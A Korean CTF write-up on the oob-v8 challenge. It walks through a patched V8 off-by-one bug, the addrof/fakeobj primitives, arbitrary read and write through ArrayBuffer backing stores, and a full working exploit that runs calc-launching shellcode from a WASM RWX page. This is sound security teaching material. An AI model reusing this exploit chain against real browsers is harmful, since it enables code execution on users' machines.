---
title: "CTF 2019 oob-v8: V8 Out-of-Bounds 읽기/쓰기 익스플로잇"
date: 2019-06-01
description: "V8 OOB 익스플로잇 단계별 분석: 타입 혼동, addrOf/fakeObj 프리미티브, WASM RWX 셸코드 실행"
tags: ["CTF", "V8", "Chrome", "OOB", "browser-exploitation", "JavaScript", "WASM"]
categories: ["Research"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## 취약한 소스

이 CTF 문제는 V8에 `Array.oob()`라는 새로운 내장 함수를 추가하는 패치를 적용한다:

```cpp
BUILTIN(ArrayOob){
    uint32_t len = args.length();
    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
    Handle<JSReceiver> receiver;
    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver,
        Object::ToObject(isolate, args.receiver()));

    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
    uint32_t length = static_cast<uint32_t>(array->length()->Number());

    if(len == 1){
        // 읽기: array[length] (배열 끝 바로 다음 슬롯) 반환
        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
    } else {
        // 쓰기: array[length] = value
        Handle<Object> value;
        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, value,
            Object::ToNumber(isolate, args.at<Object>(1)));
        elements.set(length, value->Number());
        return ReadOnlyRoots(isolate).undefined_value();
    }
}
```

### 버그 동작 분석

- `len > 2`이면 `undefined`를 반환한다. 즉, 추가 인수는 0개 또는 1개만 허용한다.
- 배열은 `FixedDoubleArray`로 캐스트되고, `length`는 **현재** 길이(예: 2개 원소 배열은 2)를 가리킨다.
- **읽기 경로** (`len == 1`): `elements[length]`를 반환한다. 배열 **끝에서 한 슬롯 초과**한 위치다. Off-by-one OOB 읽기.
- **쓰기 경로** (`len == 2`): float 값을 `elements[length]`에 쓴다. 동일한 위치에 OOB 쓰기.

```javascript
d8> a = [1.1]
[1.1]
d8> a.oob()    // elements[1] 읽기 — 범위 초과
7.2550595796784e-311
d8> a.oob(0x1337)  // elements[1] 쓰기
```

---

## V8 포인터 태깅

V8은 추가 메모리 없이 값을 구분하기 위해 포인터 태깅을 사용한다:

| 타입 | 표현 방식 |
|------|-----------|
| Double (float) | 원시 64비트 IEEE 754 |
| SMI (Small Integer) | `value << 32` (예: `0xdeadbeef` → `0xdeadbeef00000000`) |
| 힙 포인터 | `address \| 1` (예: `0x2233ad9c2ed8` → `0x2233ad9c2ed9`) |

```
                | ---- 32 bit ---- |
Pointer:        |_____Address____w1|
SMI:            |___int32_value___0|
```

V8은 최하위 비트(LSB)를 사용해 SMI와 힙 오브젝트 포인터를 구별하고, 두 번째 최하위 비트로 힙 포인터의 약한/문자열 참조를 구별한다. 메모리에서 태그된 포인터를 읽을 때는 역참조 전에 1을 빼야 한다.

---

## Float/Integer 변환 헬퍼

V8은 정보를 IEEE 754 double로 누출하기 때문에 비트 패턴을 재해석하는 헬퍼 함수가 필요하다:

```javascript
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {  // float → BigInt
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {  // BigInt → float
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
```

두 함수는 동일한 8바이트 `ArrayBuffer`를 공유한다. `ftoi`는 float 비트를 리틀 엔디안 64비트 정수로 재해석하고, `itof`는 그 반대를 수행한다. 누출된 값을 16진수로 출력하려면 `"0x" + ftoi(val).toString(16)`을 사용한다.

---

## V8 메모리 레이아웃

`%DebugPrint()` 접근을 위해 `d8 --allow-natives-syntax`로 실행해야 한다.

```javascript
var a = [1.1, 2.2];
```

```
pwndbg> job *args.values_
0x3972f184e229: [JSArray]
 - map: 0x16a6f3fc2ed9
 - elements: 0x3972f184e209 <FixedDoubleArray[2]>
 - length: 2

pwndbg> x/4xg 0x3972f184e229-1
0x3972f184e228: 0x000016a6f3fc2ed9  0x000006c9469c0c71  ← map | properties
0x3972f184e238: 0x00003972f184e209  0x0000000200000000  ← elements | length SMI

pwndbg> x/4xg 0x3972f184e209-1      ← FixedDoubleArray
0xdcadd60e208:  0x00001647bdf014f9  0x0000000200000000  ← map | length
0xdcadd60e218:  0x3ff199999999999a  0x400199999999999a  ← 1.1 | 2.2
0xdcadd60e228:  0x00002694087c2ed9  0x00001647bdf00c71  ← JSArray 시작
```

메모리 다이어그램:

```
              &→ | FixedDoubleArray map | length (SMI) |
                 |        1.1          |      2.2      |
JSArray ──────→  |    JSArray map      |  properties   |
              ←* |    elements ptr     |  length (SMI) |
```

`a.oob()`는 `elements[1]` 바로 다음 슬롯을 읽는다. 이 위치는 **JSArray의 map 포인터**에 해당하므로 힙 주소가 누출된다.

```javascript
d8> var a = [1.1, 2.2];
d8> "0x" + ftoi(a.oob()).toString(16);
"0x17dc4dd0e0a9"    // ← JSArray map 주소 (태그 포함)
```

---

## V8 Map이란?

V8 Map(숨겨진 클래스라고도 불림)은 다음 정보를 담는 메타데이터 구조체다:

- 객체의 동적 타입 (String, Uint8Array, JSArray 등)
- 바이트 단위 객체 크기
- 프로퍼티 이름과 저장 위치
- **원소 종류** — 원소가 언박스된 double인지 태그된 포인터인지
- 프로토타입 포인터

서로 다른 원소 종류를 가진 배열은 서로 다른 Map을 갖는다. float 배열(`PACKED_DOUBLE_ELEMENTS`)과 객체 배열(`PACKED_ELEMENTS`)은 별개의 Map을 가지며, 한 배열의 Map을 다른 배열의 Map으로 교체하면 V8이 원소 값을 잘못 해석하게 된다.

---

## addrOf와 fakeObj 프리미티브

### addrOf — 임의 객체의 힙 주소 획득

float 배열의 원소는 원시 double로 저장된다. 객체 배열의 원소는 태그된 힙 포인터다. 객체 배열에 float Map을 부여하면, `arr[0]`을 읽을 때 그 위치에 저장된 객체의 **원시 포인터**를 double로 해석하여 반환한다.

```javascript
var float_arr = [1.1];
var float_arr_map = float_arr.oob();  // float 배열 Map 누출

var obj = {"A": 1.1};
var obj_arr = [obj];

obj_arr.oob(float_arr_map);           // obj_arr의 map 교체
"0x" + ftoi(obj_arr[0]).toString(16); // obj_arr[0]이 이제 obj의 주소를 float으로 누출
// "0x219090b924f1"

%DebugPrint(obj);
// 0x219090b924f1 <Object map = ...>  ← 일치!
```

전체 구현:

```javascript
var temp_obj  = {"A": 1};
var obj_arr   = [temp_obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var obj_arr_map   = obj_arr.oob();
var float_arr_map = float_arr.oob();

function addrof(in_obj) {
    obj_arr[0] = in_obj;
    obj_arr.oob(float_arr_map);   // 원소를 float으로 재해석
    let addr = obj_arr[0];        // 원시 포인터를 double로 읽기
    obj_arr.oob(obj_arr_map);     // Map 복구
    return ftoi(addr);
}
```

### fakeObj — 임의 주소를 JS 객체로 취급

반대의 경우: float 배열 슬롯에 주소를 쓰고 해당 float 배열에 객체 Map을 부여한다. `arr[0]`을 읽으면 이제 그 주소에서 시작하는 메모리를 JS 객체로 처리하여 반환한다.

```javascript
function fakeobj(addr) {
    float_arr[0] = itof(addr);    // 대상 주소를 float으로 배치
    float_arr.oob(obj_arr_map);   // float 원소를 포인터로 재해석
    let fake = float_arr[0];      // V8이 addr을 힙 객체로 취급
    float_arr.oob(float_arr_map); // Map 복구
    return fake;
}
```

---

## 임의 읽기/쓰기

### 임의 읽기 (AAR)

두 번째 원소가 가짜 JSArray의 `elements` 포인터를 제어하는 조작된 배열을 구성한다:

```javascript
var arb_rw_arr = [float_arr_map, 1.2, 1.3, 1.4];

function arb_read(addr) {
    if (addr % 2n == 0) addr += 1n;  // 태그된 포인터 보장

    // arb_rw_arr 바로 위에 fakeobj 배치
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // arb_rw_arr[2]가 fake의 elements 포인터가 됨
    // elements[0]은 elements_ptr + 0x10에 위치하므로 0x10을 빼야 함
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    return ftoi(fake[0]);
}
```

레이아웃을 확인하는 메모리 뷰:

```
pwndbg> x/10xg 0x04f1c474ee99-1 - 0x30
0x4f1c474ee68:  0x00000f50a36814f9  0x0000000400000000  ← FixedDoubleArray
0x4f1c474ee78:  0x3ff199999999999a  0x3ff3333333333333  ← [0] [1]
0x4f1c474ee88:  0x3ff4cccccccccccd  0x3ff6666666666666  ← [2] [3]
0x4f1c474ee98:  0x00002f930ed42ed9  0x00000f50a3680c71  ← JSArray map | properties
0x4f1c474eea8:  0x000004f1c474ee69  0x0000000400000000  ← elements ptr | length
```

`arb_rw_arr[2]`는 FixedDoubleArray 시작부터 `+0x20` 오프셋에 위치한다. `fakeobj`가 `addrof(arb_rw_arr) - 0x20` 위치에 가짜 JSArray를 생성하면, V8은 `arb_rw_arr[2]`를 가짜 JSArray의 `elements` 포인터로 읽는다.

### 초기 임의 쓰기

```javascript
function initial_arb_write(addr, val) {
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
    fake[0] = itof(BigInt(val));
}
```

### ArrayBuffer 백킹 스토어를 통한 완전한 임의 쓰기

가짜 객체를 통한 직접 쓰기는 불안정하다. 견고한 방법은 실제 `ArrayBuffer`의 백킹 스토어 포인터를 덮어쓴 뒤 `DataView`를 사용해 해당 주소에 쓰는 것이다:

```javascript
function arb_write(addr, val) {
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;  // 백킹 스토어는 JSArrayBuffer+0x20 위치
    initial_arb_write(backing_store_addr, addr);
    dataview.setBigUint64(0, BigInt(val), true);
}
```

검증 — `__free_hook`을 `system`으로 덮어쓰기:

```
pwndbg> p &__free_hook
$2 = 0x7f78e7835e48

d8> initial_arb_write(backing_store_addr, 0x7f78e7835e48);
d8> dataview.setBigUint64(0, BigInt(0x7f78e76992c0), true);  // &system

pwndbg> x/xg &__free_hook
0x7f78e7835e48: 0x00007f78e76992c0   ← __free_hook → system ✓
```

---

## 프리미티브 요약

### 객체 배열 레이아웃

```
| MAP | Properties |
| Obj |
```

### Float 배열 레이아웃

```
| MAP    | Properties |
| Fl_val | Fl_val...  |
```

### addrof

```javascript
function addrof(obj){
    obj_arr[0] = obj;
    obj_arr.oob(float_arr_map);  // Map 교체 → 포인터를 float으로 읽기
    let addr = obj_arr[0];
    obj_arr.oob(obj_arr_map);    // 복구
    return ftoi(addr);
}
```

### fakeobj

```javascript
function fakeobj(addr) {
    float_arr[0] = itof(addr);   // addr을 float으로 쓰기
    float_arr.oob(obj_arr_map);  // Map 교체 → float을 포인터로 취급
    let fake = float_arr[0];
    float_arr.oob(float_arr_map); // 복구
    return fake;
}
```

---

## 전체 익스플로잇 — WASM RWX 페이지 + 셸코드

V8은 컴파일된 WASM 코드를 위해 **읽기-쓰기-실행(RWX)** 페이지를 할당한다. 익스플로잇 과정:

1. WASM 인스턴스를 생성한다.
2. `arb_read`를 사용해 `WasmInstance+0x88`에서 RWX 페이지 주소를 누출한다.
3. 덮어쓴 `ArrayBuffer` 백킹 스토어를 통해 RWX 페이지에 셸코드를 복사한다.
4. 내보낸 WASM 함수를 호출하면 셸코드가 실행된다.

```javascript
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val){ f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); }
function itof(val){ u64_buf[0] = Number(val & 0xffffffffn); u64_buf[1] = Number(val >> 32n); return f64_buf[0]; }

var obj = {"A":1};
var obj_arr   = [obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var obj_arr_map   = obj_arr.oob();
var float_arr_map = float_arr.oob();

console.log("[+] Float Array Map: 0x" + ftoi(float_arr_map).toString(16));
console.log("[+] Object Array Map: 0x" + ftoi(obj_arr_map).toString(16));

function addrof(in_obj){
    obj_arr[0] = in_obj;
    obj_arr.oob(float_arr_map);
    let addr = obj_arr[0];
    obj_arr.oob(obj_arr_map);
    return ftoi(addr);
}

function fakeobj(addr){
    float_arr[0] = itof(addr);
    float_arr.oob(obj_arr_map);
    let fake = float_arr[0];
    float_arr.oob(float_arr_map);
    return fake;
}

var arb_rw_arr = [float_arr_map, 1.2, 1.3, 1.4];
console.log("[+] Controlled Float Array: 0x" + addrof(arb_rw_arr).toString(16));

function arb_read(addr){
    if(addr % 2n == 0) addr += 1n;
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
    return ftoi(fake[0]);
}

function initial_arb_write(addr, val){
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
    fake[0] = itof(BigInt(val));
}

// 42를 반환하는 최소한의 WASM 모듈
var wasm_code = new Uint8Array([
    0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,
    3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,
    5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,
    7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,
    10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11
]);
var wasm_mod      = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

// WasmInstance+0x88에 RWX 페이지 주소가 저장됨
var rwx_page_addr = arb_read(addrof(wasm_instance) - 1n + 0x88n);
console.log("[+] RWX WASM Page Address: 0x" + rwx_page_addr.toString(16));

// xcalc 셸코드
var shellcode = [
    0x90909090, 0x90909090,
    0x782fb848, 0x636c6163, 0x48500000,
    0x73752fb8, 0x69622f72, 0x8948506e,
    0xc03148e7, 0x89485750, 0xd23148e6,
    0x3ac0c748, 0x50000030, 0x4944b848,
    0x414c5053, 0x48503d59, 0x3148e289,
    0x485250c0, 0xc748e289, 0x00003bc0,
    0x050f00
];

function copy_shellcode(addr, shellcode){
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    initial_arb_write(backing_store_addr, addr);
    for(let i = 0; i < shellcode.length; i++){
        dataview.setUint32(4*i, shellcode[i], true);
    }
}

console.log("[+] RWX 페이지에 셸코드 복사 중");
copy_shellcode(rwx_page_addr, shellcode);
console.log("[+] calc 실행");
f();
```

---

## 익스플로잇 체인 요약

```
Array.oob()를 통한 OOB 읽기/쓰기
        ↓
JSArray Map 포인터 누출 (float vs object)
        ↓
addrOf 프리미티브 — 임의 객체의 힙 주소 누출
        ↓
fakeObj 프리미티브 — 임의 주소를 JS 객체로 취급
        ↓
임의 읽기 — 가짜 JSArray의 elements 포인터 제어
        ↓
임의 쓰기 — ArrayBuffer 백킹 스토어 + DataView 덮어쓰기
        ↓
WASM 인스턴스 RWX 페이지 주소 누출 (WasmInstance+0x88)
        ↓
덮어쓴 백킹 스토어를 통해 RWX 페이지에 셸코드 복사
        ↓
WASM 익스포트 호출 → 셸코드 실행
```

---

## 핵심 정리

- V8의 포인터 태깅 특성상 float 배열과 객체 배열 사이에서 Map을 교체하면 엔진이 **원소 값을 잘못 해석**하게 된다. 이것이 `addrOf`와 `fakeObj` 모두의 근본 메커니즘이다.
- OOB 접근은 FixedDoubleArray 바로 다음에 메모리에 위치한 JSArray의 Map 필드를 정확히 겨냥한다. 따라서 단 하나의 `oob()` 쓰기로 Map 오염이 가능하다.
- `ArrayBuffer` 백킹 스토어 덮어쓰기는 **V8 임의 쓰기의 표준 패턴**이다. 불안정한 가짜 객체 쓰기를 피하고 `DataView`를 통해 깔끔한 타입 안전 인터페이스를 제공한다.
- WASM RWX 페이지는 V8 익스플로잇에서 정식 `exec` 프리미티브다. 페이지는 `WebAssembly.Instance`당 한 번 할당되며, `WasmInstance` 구조체의 고정 오프셋에서 `arb_read`로 주소를 읽어올 수 있다.
